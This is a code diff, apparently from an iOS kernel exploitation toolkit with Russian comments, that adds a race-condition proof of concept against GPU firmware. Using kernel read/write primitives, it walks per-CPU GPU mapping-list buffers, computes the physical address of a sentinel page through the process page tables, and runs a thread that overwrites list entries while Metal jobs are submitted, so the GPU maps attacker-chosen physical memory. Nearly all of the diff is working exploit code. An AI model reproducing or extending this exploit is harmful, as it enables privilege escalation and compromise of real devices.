@@ -5327,6 +5327,23 @@ static BOOL kpHuntPtrOK(uint64_t v)
     return pa && kpPAIsManaged(pa);
 }
 
+// RACE PoC: состояние молотилки + сам тред
+extern void kp_rc_kwrite64(uint64_t, uint64_t);
+static uint64_t gRaceBufs[12];
+static int gRaceN = 0;
+static uint64_t gRacePA = 0;
+static volatile int gRaceStop = 0;
+static void *kpRaceHammer(void *arg)
+{
+    (void)arg;
+    while (!gRaceStop) {
+        for (int n = 0; n < gRaceN; n++)
+            for (int i = 0; i < 8; i++)
+                kp_rc_kwrite64(gRaceBufs[n] + (uint64_t)i * 0x10, gRacePA);
+    }
+    return NULL;
+}
+
 + (NSString *)gartProbeReport
 {
     NSMutableString *r = [NSMutableString string];
@@ -5341,81 +5358,104 @@ static BOOL kpHuntPtrOK(uint64_t v)
     extern uint64_t kp_rc_kread64(uint64_t);
     extern void kp_rc_kwrite64(uint64_t, uint64_t);
 
-    // === LIST-ADDR: compacted list {VA, PA>>14} по формуле RE:
-    //     cpuData = 0xfffffff00aa44000 + slide (cpu0 template)
-    //     slotVA  = 0xfffffff00aa48000 + slide + (kread(cpuData+0x1a0) >> 16)
-    //     bufVA   = kread(slotVA + 8)
-    //     Дамп записей, frame type буфера, live-catch нашей записи после
-    //     submit. Если буфер writable (0x21/0x0b) — следующая сборка race.
+    // === RACE PoC: TOCTOU на compacted list {PA, count}×0x10 (type 0x0b —
+    //     ПИШЕТСЯ, доказано 1.9.79). FW берёт phys из листа при map; между
+    //     fill и GXF doorbell нет preempt-disable (окно до таймслайса).
+    //     Жертва: create shared-буфер + submit(копия buf[0]→res[0]) в цикле;
+    //     молотилка: kwrite(bufVA[cpu][i*0x10], paX) по всем CPU/первым 8.
+    //     Попадание: res[0] == маркер сентинеля → FW замапил НАШ phys.
     extern uint64_t kp_rc_kread64(uint64_t);
+    extern uint64_t vtophys(uint64_t, uint64_t);
+
+    // 1. bufVA по всем CPU (формула RE, cpu0 подтверждён 1.9.79)
     uint64_t kc = kconstant(base);
     uint64_t slide = kc - 0xfffffff007004000ULL;
-    uint64_t cpuData = 0xfffffff00aa44000ULL + slide;
-    uint64_t val = kp_rc_kread64(cpuData + 0x1a0);
-    uint64_t slotVA = 0xfffffff00aa48000ULL + slide + (val >> 16);
-    uint64_t bufVA = kp_rc_kread64(slotVA + 8);
-    // альтернативная интерпретация (константа уже runtime-форма, без slide):
-    uint64_t slotVA2 = 0xfffffff00aa48000ULL + (val >> 16);
-    uint64_t bufVA2 = kp_rc_kread64(slotVA2 + 8);
-    GNOTE( [NSString stringWithFormat:@"  slide=%#llx val(+0x1a0)=%#llx", slide, val]);
-    GNOTE( [NSString stringWithFormat:@"  A: slotVA=%#llx bufVA=%#llx", slotVA, bufVA]);
-    GNOTE( [NSString stringWithFormat:@"  B(no-slide): slotVA=%#llx bufVA=%#llx", slotVA2, bufVA2]);
-    if (!kpLooksLikeKernelPointer(bufVA) && kpLooksLikeKernelPointer(bufVA2)) {
-        GNOTE( @"  интерпретация A невалидна — берём B");
-        bufVA = bufVA2;
+    uint64_t tpl = 0xfffffff00aa44000ULL + slide;
+    uint64_t slotBase = 0xfffffff00aa48000ULL + slide;
+    uint64_t bufVAs[12]; int ncpu = 0;
+    for (int n = 0; n < 12; n++) {
+        uint64_t cdn = tpl + (uint64_t)n * 0x6eb0;
+        uint64_t probe = kp_rc_kread64(cdn + 0x1a8);
+        if (!kpLooksLikeKernelPointer(probe)) break;
+        uint64_t val = kp_rc_kread64(cdn + 0x1a0);
+        uint64_t bv = kp_rc_kread64(slotBase + (val >> 16) + 8);
+        if (!kpLooksLikeKernelPointer(bv)) break;
+        bufVAs[ncpu++] = bv;
+        GNOTE( [NSString stringWithFormat:@"  cpu%d: val=%#llx bufVA=%#llx", n, val, bv]);
     }
-    if (!kpLooksLikeKernelPointer(bufVA)) { GNOTE( @"FAIL: bufVA не kernel pointer"); gGartLive = NO; return r; }
+    if (!ncpu) { GNOTE( @"FAIL: ни одного list buffer"); gGartLive = NO; return r; }
 
-    uint64_t tableVA = [self frameTableVAWithLog:r];
-    int ft = kpVAType(bufVA, tableVA);
-    GNOTE( [NSString stringWithFormat:@"  bufVA=%#llx frame type=0x%x %@", bufVA, ft,
-               (ft == 0x21 || ft == 0x0b) ? @"— ПИШЕТСЯ, race возможен!" :
-               ft == 0x37 ? @"— per-CPU (читается, запись = EL2-килл)" : @""]);
+    // 2. сентинель-страница + self ttep для vtophys
+    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; gGartLive = NO; return r; }
+    mach_port_t tp = mach_thread_self();
+    uint64_t tva = [self rcResolveThreadKVA:tp];
+    mach_port_deallocate(mach_task_self(), tp);
+    uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
+    uint64_t sproc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
+    uint64_t pro = kp_untag_ptr(kp_rc_kread64(sproc + off_proc_p_proc_ro));
+    uint64_t stask = kp_untag_ptr(kp_rc_kread64(pro + off_proc_ro_pr_task));
+    uint64_t smap = kp_untag_ptr(kp_rc_kread64(stask + off_task_map));
+    uint64_t spmap = kp_untag_ptr(kp_rc_kread64(smap + koffsetof(vm_map, pmap)));
+    uint64_t ttep = kp_untag_ptr(kp_rc_kread64(spmap + koffsetof(pmap, ttep)));
+    vm_address_t sva = 0;
+    if (vm_allocate(mach_task_self(), &sva, 0x4000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS ||
+        mlock((void *)sva, 0x4000) != 0) { GNOTE( @"FAIL: vm_allocate/mlock"); gGartLive = NO; return r; }
+    memset((void *)sva, 0, 0x4000);
+    *(volatile uint64_t *)sva = 0x4142434445464748ULL;
+    uint64_t paX = vtophys(ttep, sva);
+    GNOTE( [NSString stringWithFormat:@"  сентинель: VA=%#llx paX=%#llx маркер=0x4142434445464748", (uint64_t)sva, paX]);
+    if (!paX) { GNOTE( @"FAIL: vtophys(sentinel)"); goto out_s; }
 
-    // дамп 16 записей (stride 0x10: {VA, PA>>14})
-    GNOTE( @"  --- 16 записей листа (rest state):");
-    for (int i = 0; i < 16; i++) {
-        uint64_t va = kp_rc_kread64(bufVA + (uint64_t)i * 0x10);
-        uint64_t pa14 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10 + 8);
-        if (va || pa14)
-            GNOTE( [NSString stringWithFormat:@"    [%2d] VA=%#llx PA=%#llx", i, va, pa14 << 14]);
-    }
+    // 3. молотилка
+    memcpy(gRaceBufs, bufVAs, sizeof(bufVAs));
+    gRaceN = ncpu; gRacePA = paX; gRaceStop = 0;
+    {
+        pthread_t ht;
+        pthread_create(&ht, NULL, kpRaceHammer, NULL);
 
-    // live-catch: создаём private-буфер, submit, сразу перечитываем лист —
-    // наши записи {gpuVA, PA>>14} должны мелькнуть.
-    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
-    id<MTLBuffer> bufB = mtl ? [mtl newBufferWithLength:0x44000 options:MTLResourceStorageModePrivate] : nil;
-    if (!bufB) { GNOTE( @"FAIL: private buffer"); gGartLive = NO; return r; }
-    uint64_t gvaB = (uint64_t)bufB.gpuAddress;
-    GNOTE( [NSString stringWithFormat:@"  live-catch: priv B gpuAddr=%#llx — submit и перечитываю", gvaB]);
-    @autoreleasepool {
+        // 4. жертва: pipeline один раз, затем цикл create+submit+проверка
+        id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
         NSError *err = nil;
-        id<MTLLibrary> lib = [mtl newLibraryWithSource:@"kernel void wf(device ulong *o [[buffer(0)]]) { o[0] = 1; }" options:nil error:&err];
-        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"wf"] : nil;
+        id<MTLLibrary> lib = [mtl newLibraryWithSource:
+            @"kernel void cp(device ulong *src [[buffer(0)]], device ulong *dst [[buffer(1)]]) { dst[0] = src[0]; }"
+            options:nil error:&err];
+        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"cp"] : nil;
         id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
         id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
-        id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
-        id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
-        if (enc) {
-            [enc setComputePipelineState:pipe];
-            [enc setBuffer:bufB offset:0 atIndex:0];
-            [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
-            [enc endEncoding];
-            [cb commit];
-            [cb waitUntilCompleted];
+        if (!q) { GNOTE( [NSString stringWithFormat:@"FAIL: Metal pipeline: %@", err]); gRaceStop = 1; pthread_join(ht, NULL); goto out_s; }
+        int hits = 0, weird = 0;
+        for (int it = 0; it < 3000 && !hits; it++) {
+            @autoreleasepool {
+                id<MTLBuffer> sb = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
+                id<MTLBuffer> rb = [mtl newBufferWithLength:0x4000 options:MTLResourceStorageModeShared];
+                *(uint64_t *)sb.contents = 0xAAAAAAAAAAAAAAAAULL;
+                *(uint64_t *)rb.contents = 0;
+                id<MTLCommandBuffer> cb = [q commandBuffer];
+                id<MTLComputeCommandEncoder> enc = [cb computeCommandEncoder];
+                [enc setComputePipelineState:pipe];
+                [enc setBuffer:sb offset:0 atIndex:0];
+                [enc setBuffer:rb offset:0 atIndex:1];
+                [enc dispatchThreads:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
+                [enc endEncoding];
+                [cb commit];
+                [cb waitUntilCompleted];
+                uint64_t got = *(uint64_t *)rb.contents;
+                if (got == 0x4142434445464748ULL) {
+                    hits++;
+                    GNOTE( [NSString stringWithFormat:@"★★★ ИНЪЕКЦИЯ ПОДТВЕРЖДЕНА! iter=%d got=%#llx — GPU прочитал НАШ phys! ★★★", it, got]);
+                } else if (got != 0xAAAAAAAAAAAAAAAAULL) {
+                    if (++weird <= 8) GNOTE( [NSString stringWithFormat:@"  странное: iter=%d got=%#llx", it, got]);
+                }
+                if (it && (it % 500) == 0) GNOTE( [NSString stringWithFormat:@"  race: %d итераций…", it]);
+            }
         }
-        GNOTE( [NSString stringWithFormat:@"  submit: status=%ld %@", (long)cb.status, cb.error ? cb.error.description : @"ok"]);
+        gRaceStop = 1;
+        pthread_join(ht, NULL);
+        GNOTE( [NSString stringWithFormat:@"  race итог: hits=%d weird=%d", hits, weird]);
     }
-    int caught = 0;
-    for (int i = 0; i < 64; i++) {
-        uint64_t va = kp_rc_kread64(bufVA + (uint64_t)i * 0x10);
-        uint64_t pa14 = kp_rc_kread64(bufVA + (uint64_t)i * 0x10 + 8);
-        if (!va && !pa14) continue;
-        NSString *mark = (va == gvaB) ? @"  ◄◄◄ НАША ЗАПИСЬ!" : @"";
-        GNOTE( [NSString stringWithFormat:@"    [%2d] VA=%#llx PA=%#llx%@", i, va, pa14 << 14, mark]);
-        if (va == gvaB) caught++;
-    }
-    GNOTE( [NSString stringWithFormat:@"  live-catch: наших записей=%d · вердикт буфера ft=0x%x", caught, ft]);
+out_s:
+    munlock((void *)sva, 0x4000);
+    vm_deallocate(mach_task_self(), sva, 0x4000);
     gGartLive = NO;
     return r;
 }
